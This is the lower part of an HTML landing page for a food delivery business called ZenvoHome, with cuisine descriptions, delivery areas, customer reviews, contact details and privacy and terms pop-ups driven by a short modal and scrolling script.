                    <p>Recognizing the digital shift, we launched our mobile application and enhanced online ordering systems. Customer feedback shaped feature development, resulting in intuitive interfaces and useful functionality. Real-time tracking became standard, giving customers transparency throughout the delivery process. Technology improved efficiency without sacrificing the personal touch that defined our service.</p>
                </div>
            </div>
            <div class="timeline_item_9r5m">
                <div class="timeline_year_4k7p">2021</div>
                <div class="timeline_content_8m2x">
                    <h3 class="timeline_heading_5n9t">Community Partnerships</h3>
                    <p>We formalized relationships with local farmers and suppliers, creating a sustainable supply chain. These partnerships ensured ingredient freshness while supporting regional agriculture. Community events and sponsorships strengthened our local presence. Charitable initiatives provided meals to those in need, reflecting our commitment to social responsibility beyond business operations.</p>
                </div>
            </div>
            <div class="timeline_item_9r5m">
                <div class="timeline_year_4k7p">2023</div>
                <div class="timeline_content_8m2x">
                    <h3 class="timeline_heading_5n9t">Sustainable Practices Implementation</h3>
                    <p>Environmental consciousness became central to operations. We transitioned to biodegradable packaging and optimized delivery routes to reduce emissions. Energy-efficient kitchen equipment lowered our carbon footprint. A comprehensive recycling program minimized waste. These changes demonstrated that business success and environmental stewardship can coexist harmoniously.</p>
                </div>
            </div>
            <div class="timeline_item_9r5m" style="border-bottom: none;">
                <div class="timeline_year_4k7p">2024</div>
                <div class="timeline_content_8m2x">
                    <h3 class="timeline_heading_5n9t">Present Day Excellence</h3>
                    <p>Today, ZenvoHome serves thousands of customers weekly across multiple regions. Our team has grown to over one hundred dedicated professionals. Despite our size, we maintain the personal approach that started it all. Innovation continues with new menu items, improved technology, and enhanced customer experiences. The journey continues as we explore new ways to serve our community better.</p>
                </div>
            </div>
        </div>
    </section>

    <section id="cuisine_3m9k" class="section_container_8h3v" style="background: white;">
        <h2 class="section_title_9k2m">Cuisine Varieties We Offer</h2>
        <img src="https://images.pexels.com/photos/1279330/pexels-photo-1279330.jpeg?auto=compress&cs=tinysrgb&w=1200" alt="Various cuisines" class="image_showcase_8n4r">
        <div class="content_grid_4j7x">
            <div class="card_item_5n8q">
                <h3 class="card_title_6p3r">🍝 Italian Classics</h3>
                <p class="card_description_7t4k">Authentic Italian flavors prepared with traditional techniques and genuine ingredients. Our pasta is made fresh daily, and sauces simmer for hours to develop rich, complex flavors. From hearty lasagna to delicate risotto, each dish transports you to the Italian countryside. Vegetarian and gluten-conscious options ensure everyone can enjoy these timeless recipes.</p>
            </div>
            <div class="card_item_5n8q">
                <h3 class="card_title_6p3r">🍜 Asian Fusion</h3>
                <p class="card_description_7t4k">Experience the vibrant tastes of Asia through our carefully curated selection. Stir-fries burst with fresh vegetables and aromatic spices. Noodle dishes range from comforting soups to bold, spicy preparations. Our chefs trained in authentic techniques while adding creative modern touches. Each meal balances sweet, sour, salty, and umami flavors perfectly.</p>
            </div>
            <div class="card_item_5n8q">
                <h3 class="card_title_6p3r">🌯 Mexican Favorites</h3>
                <p class="card_description_7t4k">Bold, satisfying Mexican cuisine made with fresh ingredients and authentic seasonings. Handmade tortillas form the foundation for tacos, burritos, and enchiladas. Salsas range from mild to fiery, all prepared in-house. Beans, rice, and proteins are seasoned with traditional spice blends. Vegetarian and vegan adaptations maintain authentic flavor profiles.</p>
            </div>
            <div class="card_item_5n8q">
                <h3 class="card_title_6p3r">🥙 Mediterranean Delights</h3>
                <p class="card_description_7t4k">Healthy Mediterranean options featuring olive oil, fresh herbs, and lean proteins. Grilled meats and vegetables showcase simple preparation that highlights natural flavors. Hummus, falafel, and tabbouleh provide plant-based protein options. These dishes embody the Mediterranean diet's health benefits while delivering satisfying taste and generous portions.</p>
            </div>
            <div class="card_item_5n8q">
                <h3 class="card_title_6p3r">🍔 American Comfort</h3>
                <p class="card_description_7t4k">Classic American dishes reimagined with quality ingredients and careful preparation. Burgers feature freshly ground beef and artisan buns. Sandwiches stack high with premium meats and crisp vegetables. Sides include hand-cut fries and seasonal salads. Comfort food doesn't mean compromising on quality or nutrition in our kitchen.</p>
            </div>
            <div class="card_item_5n8q">
                <h3 class="card_title_6p3r">🍛 Indian Specialties</h3>
                <p class="card_description_7t4k">Aromatic Indian cuisine with complex spice blends and rich sauces. Curries range from creamy kormas to spicy vindaloos, each with distinct flavor profiles. Tandoori preparations offer smoky, charred notes. Vegetarian options are plentiful, reflecting India's diverse culinary traditions. Basmati rice and fresh naan complement every meal perfectly.</p>
            </div>
        </div>
        
        <div class="info_box_3k9r" style="margin-top: 40px;">
            <h3 style="margin-bottom: 15px; color: #667eea; font-size: 24px;">Special Dietary Accommodations</h3>
            <p>We understand that dietary needs vary widely among our customers. Our menu clearly marks vegetarian, vegan, gluten-free, and dairy-free options. Allergen information is available for every dish, helping you make informed choices. Custom modifications are welcome—just let us know your requirements. Our kitchen staff is trained in cross-contamination prevention for sensitive dietary restrictions.</p>
            <p style="margin-top: 15px;">Nutritional information accompanies each menu item, including calorie counts, macronutrient breakdowns, and key vitamins. This transparency empowers you to align meals with your health goals. Whether managing specific conditions or pursuing wellness objectives, we provide the information needed for confident ordering decisions.</p>
        </div>
    </section>

    <section id="delivery_8n2r" class="section_container_8h3v">
        <h2 class="section_title_9k2m">Delivery Coverage Areas</h2>
        <img src="https://images.pexels.com/photos/4391470/pexels-photo-4391470.jpeg?auto=compress&cs=tinysrgb&w=1200" alt="Delivery service" class="image_showcase_8n4r">
        <div class="content_grid_4j7x">
            <div class="card_item_5n8q">
                <h3 class="card_title_6p3r">Downtown District</h3>
                <p class="card_description_7t4k">Our busiest service area features rapid delivery times averaging twenty-five minutes. High-rise buildings and office complexes receive special attention with coordinated lobby deliveries. Peak lunch hours see increased driver presence to maintain speed. Evening service extends until late night for those working extended hours or enjoying city nightlife.</p>
            </div>
            <div class="card_item_5n8q">
                <h3 class="card_title_6p3r">Suburban Neighborhoods</h3>
                <p class="card_description_7t4k">Residential areas receive reliable service with family-friendly timing options. Drivers familiar with local streets ensure efficient navigation. Weekend delivery windows accommodate family meal planning. We've become part of the community fabric, with drivers recognizing regular customers and their preferences.</p>
            </div>
            <div class="card_item_5n8q">
                <h3 class="card_title_6p3r">University Campus Zone</h3>
                <p class="card_description_7t4k">Student-focused service offers flexible delivery to dormitories and campus buildings. Late-night availability supports study sessions and irregular schedules. Group ordering options facilitate shared meals among roommates. Special promotions during exam periods show our support for academic success.</p>
            </div>
            <div class="card_item_5n8q">
                <h3 class="card_title_6p3r">Business Parks</h3>
                <p class="card_description_7t4k">Corporate lunch delivery includes bulk ordering capabilities for meetings and events. Scheduled deliveries arrive precisely when needed for professional gatherings. Individual orders to office buildings feature contactless delivery options. We understand workplace dining needs and adapt our service accordingly.</p>
            </div>
            <div class="card_item_5n8q">
                <h3 class="card_title_6p3r">Waterfront Area</h3>
                <p class="card_description_7t4k">Scenic waterfront locations receive full service despite unique access challenges. Drivers navigate parking and building entry efficiently. Outdoor dining areas and parks are accessible for picnic-style deliveries. Summer months see increased demand, which we meet with expanded coverage.</p>
            </div>
            <div class="card_item_5n8q">
                <h3 class="card_title_6p3r">Expanding Regions</h3>
                <p class="card_description_7t4k">New neighborhoods continuously join our service map based on customer requests. We evaluate expansion opportunities quarterly, prioritizing areas with demonstrated interest. Pilot programs test service viability before full implementation. Your feedback helps shape our growth strategy and coverage decisions.</p>
            </div>
        </div>
        
        <div class="highlight_text_5m8n" style="margin-top: 40px;">
            <p>Not sure if we deliver to your location? <a href="#contact_6p3x" style="color: #ffd700; text-decoration: underline;">Click here to continue</a> to our contact section and reach out—we're always expanding our service areas!</p>
        </div>
    </section>

    <section id="reviews_4k7m" class="section_container_8h3v" style="background: white;">
        <h2 class="section_title_9k2m">What Our Customers Say</h2>
        
        <div class="review_container_6j4w">
            <div class="review_header_2p8k">
                <div class="reviewer_avatar_7x3m">MR</div>
                <div class="reviewer_info_9k5n">
                    <div class="reviewer_name_4m7t">Margaret Richardson</div>
                    <div class="review_stars_3r8p">★★★★★</div>
                </div>
            </div>
            <p class="review_text_5j2w">"I've been ordering from ZenvoHome for eight months now and haven't been disappointed once. The consistency is remarkable—every meal arrives hot and tastes exactly as expected. Their Mediterranean platter has become my weekly treat. Delivery drivers are always courteous and professional. As someone with limited cooking time, this service has genuinely improved my quality of life."</p>
        </div>

        <div class="review_container_6j4w">
            <div class="review_header_2p8k">
                <div class="reviewer_avatar_7x3m">JT</div>
                <div class="reviewer_info_9k5n">
                    <div class="reviewer_name_4m7t">James Thompson</div>
                    <div class="review_stars_3r8p">★★★★★</div>
                </div>
            </div>
            <p class="review_text_5j2w">"Working night shifts made eating well nearly impossible until I discovered ZenvoHome. Their late-night delivery saved me from endless fast food runs. The Asian fusion options are authentic and flavorful. I appreciate the nutritional information provided—it helps me maintain my fitness goals despite irregular hours. Customer service responded quickly when I had a question about ingredients."</p>
        </div>

        <div class="review_container_6j4w">
            <div class="review_header_2p8k">
                <div class="reviewer_avatar_7x3m">SP</div>
                <div class="reviewer_info_9k5n">
                    <div class="reviewer_name_4m7t">Sarah Patterson</div>
                    <div class="review_stars_3r8p">★★★★★</div>
                </div>
            </div>
            <p class="review_text_5j2w">"As a parent of three, dinner time was always stressful until we started using ZenvoHome. The kids actually eat the vegetables in these meals! Portion sizes are generous enough that we often have leftovers for lunch. The ordering app remembers our preferences, making reordering incredibly simple. It's become our Friday night tradition, giving me a break from cooking."</p>
        </div>

        <div class="review_container_6j4w">
            <div class="review_header_2p8k">
                <div class="reviewer_avatar_7x3m">DM</div>
                <div class="reviewer_info_9k5n">
                    <div class="reviewer_name_4m7t">David Martinez</div>
                    <div class="review_stars_3r8p">★★★★☆</div>
                </div>
            </div>
            <p class="review_text_5j2w">"The food quality is consistently excellent, and I've tried probably twenty different dishes by now. My only minor complaint is that delivery times can vary during peak hours, though they're always within the estimated window. The Italian pasta dishes are restaurant-quality. I've recommended ZenvoHome to several colleagues who now order regularly too."</p>
        </div>

        <div class="review_container_6j4w">
            <div class="review_header_2p8k">
                <div class="reviewer_avatar_7x3m">LC</div>
                <div class="reviewer_info_9k5n">
                    <div class="reviewer_name_4m7t">Linda Chen</div>
                    <div class="review_stars_3r8p">★★★★★</div>
                </div>
            </div>
            <p class="review_text_5j2w">"Being vegetarian sometimes limits delivery options, but ZenvoHome has an impressive selection of plant-based meals. Everything is clearly labeled, and they accommodate special requests without hassle. The Indian vegetarian dishes are particularly outstanding—authentic spices and generous portions. Packaging is eco-friendly, which aligns with my values. This company clearly cares about more than just profits."</p>
        </div>

        <div class="review_container_6j4w">
            <div class="review_header_2p8k">
                <div class="reviewer_avatar_7x3m">RB</div>
                <div class="reviewer_info_9k5n">
                    <div class="reviewer_name_4m7t">Robert Bradley</div>
                    <div class="review_stars_3r8p">★★★★★</div>
                </div>
            </div>
            <p class="review_text_5j2w">"I'm impressed by the attention to detail in every aspect of their service. Food arrives properly packaged with utensils and napkins. The tracking feature keeps me informed without being intrusive. Prices are reasonable considering the quality and convenience. Their Mexican food reminds me of my grandmother's cooking—that's the highest compliment I can give. Will definitely continue ordering regularly."</p>
        </div>
    </section>

    <section id="contact_6p3x" class="section_container_8h3v">
        <h2 class="section_title_9k2m">Get In Touch With Us</h2>
        <div class="content_grid_4j7x">
            <div class="card_item_5n8q">
                <h3 class="card_title_6p3r">📞 Phone Contact</h3>
                <p class="card_description_7t4k">Speak directly with our customer service team for immediate assistance. Representatives are available during business hours to answer questions, take orders, or address concerns.</p>
                <p style="margin-top: 15px;"><a href="tel:+15558742390" class="phone_link_5m9x">Call: (555) 874-2390</a></p>
            </div>
            <div class="card_item_5n8q">
                <h3 class="card_title_6p3r">📧 Email Support</h3>
                <p class="card_description_7t4k">Send detailed inquiries or feedback via email. We respond to all messages within twenty-four hours during weekdays.</p>
                <p style="margin-top: 15px; color: #667eea; font-weight: bold;">support@zenvohome.com</p>
            </div>
            <div class="card_item_5n8q">
                <h3 class="card_title_6p3r">🏢 Main Office</h3>
                <p class="card_description_7t4k">Visit our headquarters for in-person consultations or partnership discussions. Office hours are Monday through Friday, 9 AM to 6 PM.</p>
                <p style="margin-top: 15px; color: #667eea; font-weight: bold;">4782 Riverside Avenue<br>Suite 320<br>Metropolitan City, MC 90210</p>
            </div>
        </div>
        
        <div class="info_box_3k9r" style="margin-top: 40px;">
            <h3 style="margin-bottom: 15px; color: #667eea; font-size: 24px;">Business Hours</h3>
            <p><strong>Monday - Friday:</strong> 11:00 AM - 10:00 PM</p>
            <p><strong>Saturday - Sunday:</strong> 12:00 PM - 11:00 PM</p>
            <p style="margin-top: 15px;">Holiday hours may vary. Check our website or call ahead during major holidays for specific availability. We strive to serve you even during special occasions when home cooking might be challenging.</p>
        </div>
    </section>

    <footer class="footer_section_9m7k">
        <div class="footer_content_4x9n">
            <div class="footer_column_6k3p">
                <h3 class="footer_heading_2r8m">ZenvoHome</h3>
                <p style="color: #bbb;">Delivering quality meals with care and consistency. Your satisfaction fuels our passion for culinary excellence and customer service.</p>
                <p style="margin-top: 20px;"><a href="tel:+15558742390" class="phone_link_5m9x">📞 (555) 874-2390</a></p>
            </div>
            <div class="footer_column_6k3p">
                <h3 class="footer_heading_2r8m">Quick Links</h3>
                <a href="#home" class="footer_link_7n4t">Home</a>
                <a href="#services_9k3m" class="footer_link_7n4t">Services</a>
                <a href="#about_7r4n" class="footer_link_7n4t">About Us</a>
                <a href="#cuisine_3m9k" class="footer_link_7n4t">Menu</a>
                <a href="#reviews_4k7m" class="footer_link_7n4t">Reviews</a>
            </div>
            <div class="footer_column_6k3p">
                <h3 class="footer_heading_2r8m">Information</h3>
                <a href="#" onclick="openModal('privacy'); return false;" class="footer_link_7n4t">Privacy Policy</a>
                <a href="#" onclick="openModal('terms'); return false;" class="footer_link_7n4t">Terms of Service</a>
                <a href="#delivery_8n2r" class="footer_link_7n4t">Delivery Areas</a>
                <a href="#contact_6p3x" class="footer_link_7n4t">Contact Us</a>
            </div>
            <div class="footer_column_6k3p">
                <h3 class="footer_heading_2r8m">Connect With Us</h3>
                <p style="color: #bbb;">Stay updated with our latest menu additions and special offers. Follow us on social media for behind-the-scenes content and cooking tips.</p>
                <p style="margin-top: 15px; color: #bbb;">Email: support@zenvohome.com</p>
            </div>
        </div>
        <div class="copyright_text_3j7k">
            <p>&copy; 2024 ZenvoHome Food Delivery Services. All rights reserved. Serving communities with dedication and delicious food.</p>
        </div>
    </footer>

    <div id="privacyModal" class="modal_overlay_8r5n" onclick="closeModalOutside(event, 'privacy')">
        <div class="modal_content_4k8p" onclick="event.stopPropagation()">
            <button class="modal_close_9m3x" onclick="closeModal('privacy')">&times;</button>
            <h2 class="modal_title_6n7r">Privacy Policy</h2>
            
            <div class="modal_section_2p5k">
                <h3 class="modal_subtitle_7x4m">Information Collection and Usage</h3>
                <p>ZenvoHome collects personal information necessary to process and deliver your food orders efficiently. This includes your name, delivery address, contact phone number, and email address. Payment information is processed through secure third-party payment processors and is not stored on our servers. We collect this data solely to fulfill our service obligations and improve customer experience.</p>
                <p style="margin-top: 15px;">Order history and preferences are maintained to streamline future ordering processes. This data helps us recommend meals based on your tastes and dietary requirements. We may collect device information and IP addresses for security purposes and to prevent fraudulent activities. All data collection complies with applicable privacy regulations and industry standards.</p>
            </div>

            <div class="modal_section_2p5k">
                <h3 class="modal_subtitle_7x4m">Data Protection Measures</h3>
                <p>We implement robust security measures to protect your personal information from unauthorized access, alteration, or disclosure. Our systems use encryption technology for data transmission and storage. Access to customer data is restricted to authorized personnel who require it for legitimate business purposes. Regular security audits ensure our protective measures remain effective against evolving threats.</p>
                <p style="margin-top: 15px;">Employee training emphasizes the importance of data privacy and confidentiality. We maintain strict policies regarding information handling and impose disciplinary measures for violations. Third-party service providers who access customer data are contractually obligated to maintain equivalent security standards. Your trust is paramount, and we continuously invest in protecting it.</p>
            </div>

            <div class="modal_section_2p5k">
                <h3 class="modal_subtitle_7x4m">Information Sharing Practices</h3>
                <p>ZenvoHome does not sell, rent, or trade your personal information to third parties for marketing purposes. We share data only when necessary to complete transactions, such as with delivery personnel who need addresses to fulfill orders. Payment processors receive only the information required to process transactions securely. These partners are bound by confidentiality agreements and privacy obligations.</p>
                <p style="margin-top: 15px;">Legal compliance may require disclosure of information to government authorities or law enforcement agencies. We will provide information only when legally obligated through valid court orders or subpoenas. In the event of a business merger or acquisition, customer data may be transferred to the new entity, with notification provided to affected customers beforehand.</p>
            </div>

            <div class="modal_section_2p5k">
                <h3 class="modal_subtitle_7x4m">Cookie Usage and Tracking</h3>
                <p>Our website uses cookies to enhance user experience and maintain session information. These small data files help remember your preferences and streamline the ordering process. Analytics cookies provide insights into website usage patterns, helping us improve functionality and content. You can configure your browser to refuse cookies, though this may limit certain website features.</p>
                <p style="margin-top: 15px;">Third-party cookies from analytics providers may be present on our site. These tools help us understand traffic sources and user behavior. We do not use cookies for targeted advertising purposes. Cookie data is retained only as long as necessary for its intended purpose and is then automatically deleted.</p>
            </div>

            <div class="modal_section_2p5k">
                <h3 class="modal_subtitle_7x4m">Your Privacy Rights</h3>
                <p>You have the right to access, correct, or delete your personal information at any time. Contact our customer service team to request data modifications or account closure. We will process such requests promptly, typically within thirty days. You may opt out of marketing communications while continuing to receive order-related messages necessary for service delivery.</p>
                <p style="margin-top: 15px;">California residents have additional rights under the California Consumer Privacy Act (CCPA). You may request detailed information about data collection and sharing practices. The right to non-discrimination ensures that exercising privacy rights does not affect service quality or pricing. We respect all privacy rights and facilitate their exercise without unnecessary barriers.</p>
            </div>

            <div class="modal_section_2p5k">
                <h3 class="modal_subtitle_7x4m">Children's Privacy Protection</h3>
                <p>Our services are not directed toward children under thirteen years of age. We do not knowingly collect personal information from minors without parental consent. If we discover that a child's information has been collected inadvertently, we will delete it promptly. Parents or guardians who believe their child's information has been collected should contact us immediately.</p>
            </div>

            <div class="modal_section_2p5k">
                <h3 class="modal_subtitle_7x4m">Policy Updates and Changes</h3>
                <p>This privacy policy may be updated periodically to reflect changes in our practices or legal requirements. Material changes will be communicated through email notifications or prominent website notices. Continued use of our services after policy updates constitutes acceptance of the revised terms. We encourage periodic review of this policy to stay informed about how we protect your information.</p>
                <p style="margin-top: 15px;">The effective date of the current policy is displayed at the top of this document. Previous versions are archived and available upon request. Questions or concerns about our privacy practices should be directed to our privacy officer through the contact information provided on our website.</p>
            </div>

            <div class="modal_section_2p5k">
                <h3 class="modal_subtitle_7x4m">Contact Information for Privacy Concerns</h3>
                <p>For privacy-related inquiries or to exercise your data rights, contact our dedicated privacy team at privacy@zenvohome.com or call (555) 874-2390. Written correspondence can be sent to our main office address listed in the contact section. We respond to all privacy inquiries within a reasonable timeframe and work diligently to address concerns satisfactorily.</p>
            </div>
        </div>
    </div>

    <div id="termsModal" class="modal_overlay_8r5n" onclick="closeModalOutside(event, 'terms')">
        <div class="modal_content_4k8p" onclick="event.stopPropagation()">
            <button class="modal_close_9m3x" onclick="closeModal('terms')">&times;</button>
            <h2 class="modal_title_6n7r">Terms of Service</h2>
            
            <div class="modal_section_2p5k">
                <h3 class="modal_subtitle_7x4m">Service Agreement Overview</h3>
                <p>These Terms of Service constitute a legally binding agreement between you and ZenvoHome Food Delivery Services. By accessing our website, placing orders, or using our services, you acknowledge that you have read, understood, and agree to be bound by these terms. If you do not agree with any provision, please discontinue use of our services immediately.</p>
                <p style="margin-top: 15px;">We reserve the right to modify these terms at any time without prior notice. Changes become effective immediately upon posting to our website. Your continued use of services after modifications constitutes acceptance of updated terms. It is your responsibility to review these terms periodically to stay informed of any changes.</p>
            </div>

            <div class="modal_section_2p5k">
                <h3 class="modal_subtitle_7x4m">Order Placement and Acceptance</h3>
                <p>Placing an order through our platform constitutes an offer to purchase food delivery services. We reserve the right to accept or decline any order at our discretion. Order acceptance occurs when we send confirmation via email or text message. Until acceptance, we are not obligated to fulfill the order, and no contract exists between parties.</p>
                <p style="margin-top: 15px;">Accurate information must be provided when placing orders, including delivery address, contact details, and special instructions. Errors in provided information may result in delivery delays or inability to complete service. You are responsible for ensuring someone is available to receive the delivery at the specified location during the estimated delivery window.</p>
            </div>

            <div class="modal_section_2p5k">
                <h3 class="modal_subtitle_7x4m">Payment Terms and Conditions</h3>
                <p>Payment is due at the time of order placement unless alternative arrangements have been made. We accept major credit cards, debit cards, and approved digital payment methods. All transactions are processed in United States dollars. You authorize us to charge the payment method provided for the total order amount, including applicable taxes and delivery fees.</p>
                <p style="margin-top: 15px;">Promotional codes and discounts are subject to specific terms and expiration dates. Only one promotional code may be applied per order unless otherwise stated. We reserve the right to cancel orders if payment cannot be processed or if fraudulent activity is suspected. Chargebacks initiated without attempting to resolve issues through customer service may result in account suspension.</p>
            </div>

            <div class="modal_section_2p5k">
                <h3 class="modal_subtitle_7x4m">Delivery Policies and Expectations</h3>
                <p>Estimated delivery times are approximations based on current conditions and are not guaranteed. Factors beyond our control, including weather, traffic, and unforeseen circumstances, may affect delivery timing. We strive to meet estimated windows but cannot be held liable for delays caused by external factors. Customers will be notified of significant delays whenever possible.</p>
                <p style="margin-top: 15px;">Delivery is completed when food is handed to the customer or left at the specified location per instructions. Contactless delivery options are available upon request. Once delivery is completed, responsibility for the food transfers to the customer. We are not liable for food left unattended per customer instructions or for issues arising after successful delivery.</p>
            </div>

            <div class="modal_section_2p5k">
                <h3 class="modal_subtitle_7x4m">Cancellation and Refund Policy</h3>
                <p>Orders may be cancelled without penalty if done before food preparation begins. Once preparation has started, cancellations may incur partial charges to cover food costs and labor. Refund requests must be submitted within forty-eight hours of delivery and will be evaluated on a case-by-case basis. Valid reasons include incorrect orders, quality issues, or non-delivery.</p>
                <p style="margin-top: 15px;">Refunds are processed to the original payment method within seven to ten business days of approval. We may offer credits or replacements instead of monetary refunds at our discretion. Repeated refund requests may trigger account review to prevent abuse. Photographic evidence may be requested to substantiate quality complaints.</p>
            </div>

            <div class="modal_section_2p5k">
                <h3 class="modal_subtitle_7x4m">Food Safety and Allergen Information</h3>
                <p>While we provide allergen information and accommodate dietary restrictions, we cannot guarantee complete absence of allergens due to potential cross-contamination in kitchen environments. Customers with severe allergies should exercise caution and contact us directly to discuss specific concerns. We are not liable for allergic reactions resulting from undisclosed allergies or sensitivities.</p>
                <p style="margin-top: 15px;">Food should be consumed promptly after delivery to ensure optimal quality and safety. Proper food handling after delivery is the customer's responsibility. We adhere to all food safety regulations during preparation and transport but cannot control conditions after delivery. Perishable items should be refrigerated immediately if not consumed right away.</p>
            </div>

            <div class="modal_section_2p5k">
                <h3 class="modal_subtitle_7x4m">Intellectual Property Rights</h3>
                <p>All content on our website, including text, graphics, logos, images, and software, is the property of ZenvoHome or its content suppliers and is protected by intellectual property laws. You may not reproduce, distribute, modify, or create derivative works without explicit written permission. Unauthorized use may result in legal action and account termination.</p>
                <p style="margin-top: 15px;">Trademarks and service marks displayed on our website are registered and unregistered marks of ZenvoHome. Nothing in these terms grants you any right to use our trademarks without prior written consent. User-generated content submitted to our platform grants us a non-exclusive license to use, reproduce, and display such content for business purposes.</p>
            </div>

            <div class="modal_section_2p5k">
                <h3 class="modal_subtitle_7x4m">Limitation of Liability</h3>
                <p>ZenvoHome's liability is limited to the amount paid for the specific order in question. We are not liable for indirect, incidental, consequential, or punitive damages arising from service use or inability to use services. This limitation applies regardless of the legal theory upon which claims are based, whether contract, tort, or otherwise.</p>
                <p style="margin-top: 15px;">We do not warrant that services will be uninterrupted, error-free, or completely secure. Technical issues, system maintenance, or external factors may temporarily affect service availability. You agree to use services at your own risk and acknowledge that we cannot guarantee perfect performance at all times.</p>
            </div>

            <div class="modal_section_2p5k">
                <h3 class="modal_subtitle_7x4m">Dispute Resolution and Governing Law</h3>
                <p>These terms are governed by the laws of the state in which our principal business office is located, without regard to conflict of law provisions. Any disputes arising from these terms or service use shall be resolved through binding arbitration rather than court litigation. Arbitration proceedings will be conducted by a mutually agreed-upon arbitrator or arbitration service.</p>
                <p style="margin-top: 15px;">You waive the right to participate in class action lawsuits or class-wide arbitration against ZenvoHome. Each party bears its own costs and attorney fees unless the arbitrator determines otherwise. This arbitration agreement does not prevent either party from seeking injunctive relief in court for intellectual property violations or other urgent matters.</p>
            </div>

            <div class="modal_section_2p5k">
                <h3 class="modal_subtitle_7x4m">Account Responsibilities</h3>
                <p>If you create an account, you are responsible for maintaining the confidentiality of your login credentials. All activities occurring under your account are your responsibility. Notify us immediately of any unauthorized access or security breaches. We are not liable for losses resulting from unauthorized account use if you failed to protect your credentials adequately.</p>
                <p style="margin-top: 15px;">Accounts may be suspended or terminated for violations of these terms, fraudulent activity, or abusive behavior toward staff. We reserve the right to refuse service to anyone for any lawful reason. Terminated accounts forfeit any unused credits or promotional balances without refund.</p>
            </div>

            <div class="modal_section_2p5k">
                <h3 class="modal_subtitle_7x4m">Contact for Terms Questions</h3>
                <p>Questions regarding these Terms of Service should be directed to legal@zenvohome.com or by calling (555) 874-2390. We will address inquiries promptly and provide clarification on any provisions you find unclear. Written correspondence can be sent to our main office address listed in the contact section of our website.</p>
            </div>
        </div>
    </div>

    <script>
        function openModal(type) {
            if (type === 'privacy') {
                document.getElementById('privacyModal').style.display = 'block';
            } else if (type === 'terms') {
                document.getElementById('termsModal').style.display = 'block';
            }
            document.body.style.overflow = 'hidden';
        }

        function closeModal(type) {
            if (type === 'privacy') {
                document.getElementById('privacyModal').style.display = 'none';
            } else if (type === 'terms') {
                document.getElementById('termsModal').style.display = 'none';
            }
            document.body.style.overflow = 'auto';
        }

        function closeModalOutside(event, type) {
            if (event.target.classList.contains('modal_overlay_8r5n')) {
                closeModal(type);
            }
        }

        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
            anchor.addEventListener('click', function (e) {
                e.preventDefault();
                const target = document.querySelector(this.getAttribute('href'));
                if (target) {
                    target.scrollIntoView({
                        behavior: 'smooth',
                        block: 'start'
                    });
                }
            });
        });
    </script>

    <a href="/" alt="stats counter free" target="_blank" >
<img  src="https://sstatic1.histats.com/0.gif?4977134&101" alt="stats counter free" border="0">
        
</body>
</html>












